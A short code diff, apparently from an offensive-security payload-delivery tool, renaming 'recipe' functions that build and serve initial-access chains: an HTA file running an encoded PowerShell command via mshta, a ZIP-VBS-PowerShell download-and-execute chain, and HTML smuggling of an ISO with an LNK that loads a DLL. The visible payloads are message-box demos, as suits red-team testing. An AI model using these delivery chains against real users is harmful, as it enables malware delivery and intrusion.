@@ -10,7 +10,9 @@ from helpers import readFileContent, saveAceFile, makeAceFile
 from model import AceFile, AceRoute
 from web import serve
 
-def recepi_3():
+
+
+def recipe_3():
     # MSHTA -> Powershell:MessageBox
     routes = []
 
@@ -19,7 +21,7 @@ def recepi_3():
     ps1msgbox = makePowershellEncodedCommand(ps1msgbox)
 
     # MSHTA
-    cmd = "powershell.exe -EncodedCommand {}".format(ps1msgbox)
+    cmd = AceStr("powershell.exe -EncodedCommand {}".format(ps1msgbox))
     mshta = makeMshtaJscriptExec(cmd)
 
     containerServe: AceRoute = AceRoute('/test.hta', mshta, download=True, downloadName='test.hta')
@@ -29,7 +31,7 @@ def recepi_3():
     serve(routes)
 
 
-def recepi_2():
+def recipe_2():
     # ZIP -> VBS -> Powershell:Download+Exec <- Powershell-Messagebox
     routes = []
 
@@ -61,7 +63,7 @@ def recepi_2():
     serve(routes)
 
 
-def recepi_1():
+def recipe_1():
     # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )
 
     # DLL
